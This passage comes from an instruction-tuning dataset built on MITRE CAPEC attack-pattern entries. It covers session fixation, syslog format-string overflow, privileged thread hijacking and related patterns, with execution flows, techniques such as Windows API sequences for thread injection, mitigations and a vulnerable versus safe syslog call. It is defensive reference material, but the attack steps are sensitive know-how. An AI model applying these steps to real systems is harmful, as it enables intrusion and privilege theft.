            "Design: Utilize digital signatures to increase authentication assurance.",
            "Design: Utilize two factor authentication to increase authentication assurance.",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.",
            "Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.",
            "Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.",
            "Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Exploiting Trust in Client (aka Make the Client Invisible)"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Probe Audio and Video Peripherals (CAPEC ID: 634)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.\n- An adversary can capture and record from audio peripherals in a vehicle via a Car Whisperer attack. If an adversary is within close proximity to a vehicle with Bluetooth capabilities, they may attempt to connect to the hands-free system when it is in pairing mode. With successful authentication, if an authentication system is present at all, an adversary may be able to play music/voice recordings, as well begin a recording and capture conversations happening inside the vehicle. Successful authentication relies on the pairing security key being set to a default value, or by brute force (which may be less practical in an outside environment) Depending on the sensitivity of the information being discussed, this scenario can be extremely compromising.\n- An adversary may also use a technique called Bluebugging, which is similar to Bluesnarfing but requires the adversary to be between 10-15 meters of the target device. Bluebugging creates a backdoor for an attacker to listen/record phone calls, forward calls, send SMS and retrieve the phonebook.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.",
        "An adversary can capture and record from audio peripherals in a vehicle via a Car Whisperer attack. If an adversary is within close proximity to a vehicle with Bluetooth capabilities, they may attempt to connect to the hands-free system when it is in pairing mode. With successful authentication, if an authentication system is present at all, an adversary may be able to play music/voice recordings, as well begin a recording and capture conversations happening inside the vehicle. Successful authentication relies on the pairing security key being set to a default value, or by brute force (which may be less practical in an outside environment) Depending on the sensitivity of the information being discussed, this scenario can be extremely compromising.",
        "An adversary may also use a technique called Bluebugging, which is similar to Bluesnarfing but requires the adversary to be between 10-15 meters of the target device. Bluebugging creates a backdoor for an attacker to listen/record phone calls, forward calls, send SMS and retrieve the phonebook."
      ],
      "@Name": "Probe Audio and Video Peripherals (CAPEC ID: 634)",
      "attack_ptrn": {
        "@ID": "634",
        "@Name": "Probe Audio and Video Peripherals",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "651",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "514"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "545"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Knowledge of the target device's or application\u2019s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "To deploy a hidden process or malware on the system to automatically collect audio and video data."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Prevent unknown code from executing on a system through the use of an allowlist policy.",
            "Patch installed applications as soon as new updates become available."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.",
            "An adversary can capture and record from audio peripherals in a vehicle via a Car Whisperer attack. If an adversary is within close proximity to a vehicle with Bluetooth capabilities, they may attempt to connect to the hands-free system when it is in pairing mode. With successful authentication, if an authentication system is present at all, an adversary may be able to play music/voice recordings, as well begin a recording and capture conversations happening inside the vehicle. Successful authentication relies on the pairing security key being set to a default value, or by brute force (which may be less practical in an outside environment) Depending on the sensitivity of the information being discussed, this scenario can be extremely compromising.",
            "An adversary may also use a technique called Bluebugging, which is similar to Bluesnarfing but requires the adversary to be between 10-15 meters of the target device. Bluebugging creates a backdoor for an attacker to listen/record phone calls, forward calls, send SMS and retrieve the phonebook."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "267"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1123",
              "Entry_Name": "Audio Capture"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1125",
              "Entry_Name": "Video Capture"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-653"
            },
            {
              "@External_Reference_ID": "REF-654"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2018-07-31"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Session Fixation (CAPEC ID: 61)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Session Fixation (CAPEC ID: 61) are: Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.\nAn attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.",
        "An attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182"
      ],
      "@Name": "Session Fixation (CAPEC ID: 61)",
      "attack_ptrn": {
        "@ID": "61",
        "@Name": "Session Fixation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "593"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Setup the Attack] Setup a session: The attacker has to setup a trap session that provides a valid session identifier, or select an arbitrary identifier, depending on the mechanism employed by the application. A trap session is a dummy session established with the application by the attacker and is used solely for the purpose of obtaining valid session identifiers. The attacker may also be required to periodically refresh the trap session in order to obtain valid session identifiers.",
              "Technique": [
                "The attacker chooses a predefined identifier that they know.",
                "The attacker creates a trap session for the victim."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attract a Victim] Fixate the session: The attacker now needs to transfer the session identifier from the trap session to the victim by introducing the session identifier into the victim's browser. This is known as fixating the session. The session identifier can be introduced into the victim's browser by leveraging cross site scripting vulnerability, using META tags or setting HTTP response headers in a variety of ways.",
              "Technique": [
                "Attackers can put links on web sites (such as forums, blogs, or comment forms).",
                "Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.",
                "Attackers can email attack URLs to potential victims through spam and phishing techniques."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.",
              "Technique": [
                "The attacker loads the predefined session ID into their browser and browses to protected data or functionality.",
                "The attacker loads the predefined session ID into their software and utilizes functionality with the rights of the victim."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Session identifiers that remain unchanged when the privilege levels change.",
            "Permissive session management mechanism that accepts random user-generated session identifiers",
            "Predictable session identifiers"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Only basic skills are required to determine and fixate session identifiers in a user's browser. Subsequent attacks may require greater skill levels depending on the attackers' motives."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Indicators": {
          "Indicator": [
            "There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.",
            "A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect."
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.",
            "Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.",
            "Use session identifiers that are difficult to guess or brute-force: One way for the attackers to obtain valid session identifiers is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Consider a banking application that issues a session identifier in the URL to a user before login, and uses the same identifier to identify the customer following successful authentication. An attacker can easily leverage session fixation to access a victim's account by having the victim click on a forged link that contains a valid session identifier from a trapped session setup by the attacker. Once the victim is authenticated, the attacker can take over the session and continue with the same levels of privilege as the victim.",
            "An attacker can hijack user sessions, bypass authentication controls and possibly gain administrative privilege by fixating the session of a user authenticating to the Management Console on certain versions of Macromedia JRun 4.0. This can be achieved by setting the session identifier in the user's browser and having the user authenticate to the Management Console. Session fixation is possible since the application server does not regenerate session identifiers when there is a change in the privilege levels. See also: CVE-2004-2182"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "664"
            },
            {
              "@CWE_ID": "732"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "37",
              "Entry_Name": "Session Fixation"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Session fixation"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-601",
              "@Section": "Testing for Session Fixation"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'String Format Overflow in syslog() (CAPEC ID: 67)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412",
      "@Name": "String Format Overflow in syslog() (CAPEC ID: 67)",
      "attack_ptrn": {
        "@ID": "67",
        "@Name": "String Format Overflow in syslog()",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets applications and software that uses the syslog() function insecurely. If an application does not explicitely use a format string parameter in a call to syslog(), user input can be placed in the format string parameter leading to a format string injection attack. Adversaries can then inject malicious format string commands into the function call leading to a buffer overflow. There are many reported software vulnerabilities with the root cause being a misuse of the syslog() function.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "100"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "135"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack, adversaries look for applications that use syslog() incorrectly."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.",
              "Technique": "Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.",
              "Technique": [
                "The formatting characters %s and %d are useful for observing memory and trying to print memory addresses. If an adversary has access to the log being written to they can observer this output and use it to help craft their attack.",
                "The formatting character %n is useful for adding extra data onto the buffer."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the injection vector, the adversary supplies the program with the crafted format string injection, causing a buffer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The Syslog function is used without specifying a format string argument, allowing user input to be placed direct into the function call as a format string."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": {
            "xhtml:p": [
              "The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog():",
              "The following code shows a vulnerable usage of Syslog():"
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "good",
                "#text": "syslog(LOG_ERR, \"%s\", cmdBuf);"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "bad",
                "xhtml:div": {
                  "xhtml:i": "// the buffer cmdBuff is taking user supplied data."
                },
                "#text": "syslog(LOG_ERR, cmdBuf);"
              }
            ]
          }
        },
        "Example_Instances": {
          "Example": "Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "134"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "680"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "06",
            "Entry_Name": "Format String"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-503"
            },
            {
              "@External_Reference_ID": "REF-504"
            },
            {
              "@External_Reference_ID": "REF-505"
            },
            {
              "@External_Reference_ID": "REF-506"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Prerequisites, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Hijacking a Privileged Thread of Execution (CAPEC ID: 30)",
    "context": "",
    "output": "Examples of Hijacking a Privileged Thread of Execution (CAPEC ID: 30) are: Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.",
      "@Name": "Hijacking a Privileged Thread of Execution (CAPEC ID: 30)",
      "attack_ptrn": {
        "@ID": "30",
        "@Name": "Hijacking a Privileged Thread of Execution",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary hijacks a privileged thread of execution by injecting malicious code into a running process. By using a privleged thread to do their bidding, adversaries can evade process-based detection that would stop an attack that creates a new process. This can lead to an adversary gaining access to the process's memory and can also enable elevated privileges. The most common way to perform this attack is by suspending an existing thread and manipulating its memory.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "233",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target thread] The adversary determines the underlying system thread that is subject to user-control"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Gain handle to thread] The adversary then gains a handle to a process thread.",
              "Technique": [
                "Use the \"OpenThread\" API call in Windows on a known thread.",
                "Cause an exception in a java privileged block public function and catch it, or catch a normal signal. The thread is then hanging and the adversary can attempt to gain a handle to it."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Alter process memory] Once the adversary has a handle to the target thread, they will suspend the thread and alter the memory using native OS calls.",
              "Technique": "On Windows, use \"SuspendThread\" followed by \"VirtualAllocEx\", \"WriteProcessMemory\", and \"SetThreadContext\"."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Resume thread execution] Once the process memory has been altered to execute malicious code, the thread is then resumed.",
              "Technique": "On Windows, use \"ResumeThread\"."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users",
            "In order to feasibly execute this class of attacks, the adversary must have the ability to hijack a privileged thread. This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or calling native OS calls that can suspend and alter process memory. This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread."
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread.",
              "The adversary does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary's malicious code. This is the case even if the adversary conducts the attack remotely."
            ]
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.",
            "Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope."
          ]
        },
        "Example_Instances": {
          "Example": "Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "270"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1055.003",
            "Entry_Name": "Process Injection: Thread Execution Hijacking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, Probing_Techniques"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Prerequisites"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Network Boundary Bridging (CAPEC ID: 700)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco\u2019s unauthenticated SMI management protocol to download a target\u2019s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device\u2019s configurations, they could modify it to redirect network traffic through other network infrastructure.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco\u2019s unauthenticated SMI management protocol to download a target\u2019s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device\u2019s configurations, they could modify it to redirect network traffic through other network infrastructure.",
      "@Name": "Network Boundary Bridging (CAPEC ID: 700)",
      "attack_ptrn": {
        "@ID": "700",
        "@Name": "Network Boundary Bridging",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary which has gained elevated access to network boundary devices may use these devices to create a channel to bridge trusted and untrusted networks. Boundary devices do not necessarily have to be on the network\u2019s edge, but rather must serve to segment portions of the target network the adversary wishes to cross into.",
        "Extended_Description": {
          "xhtml:p": "Network boundary devices are network devices such as routers and firewalls which segment networks by restricting certain types of traffic from flowing through the device. Network boundary devices are often directly accessible through a portal page for management purposes. An adversary\u2019s goal when conducting network boundary bridging is to connect networks which are being segmented by the device. To do so, the adversary must first compromise the network boundary device."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "161"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "70"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "560"
            }
          ]
        },
